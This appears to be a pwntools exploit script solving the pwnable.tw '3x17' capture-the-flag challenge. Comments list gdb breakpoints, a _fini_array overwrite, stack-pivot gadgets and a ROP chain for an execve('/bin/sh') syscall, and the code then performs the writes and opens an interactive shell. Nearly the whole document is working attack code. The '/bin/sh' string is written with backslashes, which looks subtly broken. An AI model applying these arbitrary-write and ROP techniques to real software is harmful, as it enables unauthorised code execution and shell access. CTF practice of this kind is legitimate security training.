from pwn import *

# r = remote('chall.pwnable.tw',10105)
r = process('./3X17')
''' 
## 1
    (gdb) source gdb_script.py
    b *0x401b6d # main
    b *0x401bed
    b *0x402988

    arbitary write any addr (must in integer) with 24 bytes

## 2
    overwrite _fini_array
        0x4b40f0 <_fini_array>:     0x401b00  0x401580
        0x4b4100 <_data_rel_ro>:    0x2 

    break the infinite loop
        401c4b : leave ; ret


## 3
    Stack pivot:

        0x4715ec:
                    mov    bl,0x48
                    mov    eax,edx
                    ret

        0x44f62b:   xchg   esp,eax
                    ret

        0x48a578:   mov    rax,QWORD PTR [rsi+0x8]
                    ret




    syscall system:
        rax = 0x3b
        rdi = ptr to "/bin/sh" ()
        rsi = 0
        rdx = 0

    ROPgadget:
        stack[0]: 0x4725a7
            pop     rax
            retn
        stack[1]: 0x3b
        stack[2]: 0x446e35
            pop     rdx
            ret
        stack[2]: &stack[10]
        stack[4]: 0x4576de   
            pop     rsi
            ret
        stack[5]: &stack[10]
        stack[6]: 0x47dce5  
            pop     rdi
            ret
        stack[7]: &stack[9]
        stack[8]: 0x47ab31
            syscall
        stack[9]: '\bin\sh\x00
        stack[10]:  0x0
        
        

'''
r.sendafter("addr:", str(0x4b40f0)) # overwrite _fini_array
r.sendafter("data:", p64(0x402960) + p64(0x401b6d)) # 0x402960 execute all func_ptr in _fini_array
pause()

r.sendafter("addr:", str(0x4B40F8 + 0x10))
r.sendafter("data:", p64(0x4576de) + p64(0x4b40f8 + 0x60))

r.sendafter("addr:", str(0x4b40f8 + 0x20))
r.sendafter("data:", p64(0x47dce5) + p64(0x4b40f8 + 0x58))

r.sendafter("addr:", str(0x4b40f8 + 0x30))
r.sendafter("data:", p64(0x446e35) + p64(0x4b40f8 + 0x60))

r.sendafter("addr:", str(0x4b40f8 + 0x40))
r.sendafter("data:", p64(0x4725a7) + p64(0x3b))

r.sendafter("addr:", str(0x4b40f8 + 0x50))
r.sendafter("data:", p64(0x4022b4) + b'\\bin\\sh\x00' + p64(0))


# write rop which change esp to 0x4b4108
stack_setter_payload = p64(0x44f62b) + p64(0x48a578) + p64(0x0)
r.sendafter("addr:", str(0x4B4320))
r.sendafter("data:", stack_setter_payload)
pause()
    
# write address for ebx increase
# which finally triggers esp changer code
ebx_inc_payload = p64(0x4715ec) + p64(0x4b4108)  
r.sendafter("addr:", str(0x4B40F8))
r.sendafter("data:", ebx_inc_payload)
pause()





print("Done!")
r.interactive()